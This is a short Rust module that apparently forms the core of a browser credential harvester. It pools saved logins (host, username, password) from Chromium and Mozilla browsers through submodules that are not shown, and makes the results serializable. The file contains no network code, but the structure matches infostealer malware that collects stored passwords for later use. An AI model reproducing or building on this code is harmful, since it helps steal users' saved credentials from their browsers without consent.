pub mod mozilla;
pub mod chromium;

use mozilla::get_creds_moz;
use chromium::get_creds_chromium;

use serde::Serialize;

#[derive(Serialize)]
#[derive(Debug)]
pub struct Login {
    host: String,
    user: String,
    pass: String,
}

pub fn get_creds_all() -> Option<Vec<Login>> {
    let mut creds: Vec<Login> = Vec::new();
    if let Some(mut cred) = get_creds_chromium() {
        creds.append(&mut cred)
    }
    if let Some(mut cred) = get_creds_moz() {
        creds.append(&mut cred)
    }
    if creds.is_empty() {return None;}
    Some(creds)
}